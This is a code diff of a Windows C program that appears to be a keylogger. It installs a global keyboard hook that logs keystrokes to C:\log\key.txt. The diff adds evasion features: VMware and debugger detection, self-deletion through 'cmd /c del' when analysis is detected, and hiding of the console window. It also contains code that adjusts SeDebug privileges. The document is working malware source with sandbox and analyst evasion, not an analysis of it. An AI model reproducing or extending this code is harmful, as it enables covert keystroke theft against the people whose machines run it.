@@ -1,3 +1,5 @@
+#define _CRT_SECURE_NO_WARNINGS
+
 #include <windows.h>
 #include <stdio.h> 
 #include <tchar.h>
@@ -22,12 +24,12 @@ bool AdjustProcessTokenPrivilege() {
     TOKEN_PRIVILEGES tkp;
 
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        OutputDebugString("AdjustProcessTokenPrivilege OpenProcessToken Failed ! \n");
+        printf("AdjustProcessTokenPrivilege OpenProcessToken Failed ! \n");
         return false;
     }
 
     if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidTmp)) {
-        OutputDebugString("AdjustProcessTokenPrivilege LookupPrivilegeValue Failed ! \n");
+        printf("AdjustProcessTokenPrivilege LookupPrivilegeValue Failed ! \n");
         CloseHandle(hToken);
         return FALSE;
     }
@@ -37,11 +39,26 @@ bool AdjustProcessTokenPrivilege() {
     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
     if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
-        OutputDebugString("AdjustProcessTokenPrivilege AdjustTokenPrivileges Failed ! \n");
+        printf("AdjustProcessTokenPrivilege AdjustTokenPrivileges Failed ! \n");
         CloseHandle(hToken);
         return FALSE;
     }
     return true;
+}
+
+void delself(){
+    char Filename[256];
+    char Parameters[256];
+
+    GetModuleFileNameA(0, Filename, 256);
+    GetShortPathNameA(Filename, Filename, 256);
+    strcpy(Parameters, "/c del ");
+    strcat(Parameters, Filename);
+    strcat(Parameters, " >> NUL");
+    printf("del?\n");
+    system("pause");
+    ShellExecuteA(0, 0, "cmd.exe", Parameters, 0, 0);
+    exit(-1);
 }
 
 DWORD FindProcess(LPCTSTR ProcessName){
@@ -68,13 +85,13 @@ bool DetectVM(){
     //查看当前运行的进程
     if(FindProcess((LPCTSTR)"vmtoolsd.exe") || FindProcess((LPCTSTR)"vmacthlp.exe")){
         printf("Find VM process\n");
-        is_VM = true;
+        is_VM |= true;
     }
 
     //查看vmtool程序路径
     if(PathIsDirectory((LPCTSTR)"C:\\Program Files\\VMware\\VMware Tools\\")){
         printf("Find VMtool folder\n");
-        is_VM = true;
+        is_VM |= true;
     }
 
     //in
@@ -98,11 +115,11 @@ bool DetectVM(){
         }
     }
     __except(EXCEPTION_EXECUTE_HANDLER){
-        is_VM = false;
+        is_VM |= false;
     }
     if(is_VM){
         printf("I/O works\n");
-        is_VM = true;
+        is_VM |= true;
     }
 
     return is_VM;
@@ -159,7 +176,7 @@ bool DetectDebug(){
     //Win API
     if(IsDebuggerPresent()){
         printf("IsDebuggerPresent\n");
-        is_Debug = true;
+        is_Debug |= true;
     }
     
     //PEB
@@ -170,7 +187,7 @@ bool DetectDebug(){
     }
     if(is_Debug){
         printf("PEB BeingDebugged set\n");
-        is_Debug = true;
+        is_Debug |= true;
     }
 
     // int 3
@@ -192,28 +209,31 @@ bool DetectDebug(){
         __asm int 3
     }
     __except(1){
-        return false;
+        return is_Debug | false;
     }
-    is_Debug = true;
+    is_Debug |= true;
 
 
     return is_Debug;
 }
 
-int main(){
+int main(int argc, char *argv[]){
     printf("Start\n");
     //虚拟机检测
     if(DetectVM() == true){
         printf("running in VM, exiting\n");
-        return 1;
+        delself();
     }
 
     //调试过程检测
     if(DetectDebug() == true){
         printf("running under debug mode\n");
-        return 1;
+        delself();
     }
     
+    //隐藏cmd窗口
+    ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);
+
     //提权
     //AdjustProcessTokenPrivilege();
 
@@ -232,13 +252,7 @@ int main(){
         return 1;
     }
     
-    //
     
-    // DWORD ThreadId = FindProcess((LPCTSTR)"notepad.exe");
-    // if(ThreadId == 0){
-    //     printf("process didn't open?\n");
-    //     return 1;
-    // }
 
     HHOOK hhook = SetWindowsHookEx(
     WH_KEYBOARD,//WH_KEYBOARD,//WH_CALLWNDPROC,
@@ -246,7 +260,13 @@ int main(){
     hMod,
     0);//此处输入线程标识符，若为0则捕获全局键盘消息
     
-    printf("Hook Sueecss!\n Output: C:\\log\\key.txt");
+    if(hhook == 0){
+        printf("Hook Fail\n");
+        return 1;
+    }
+    else
+        printf("Hook Sueecss!\n Output: C:\\log\\key.txt");
+
     MSG msg;
     while(1){
         if (PeekMessageA(&msg, 0, 0, 0, PM_REMOVE)){
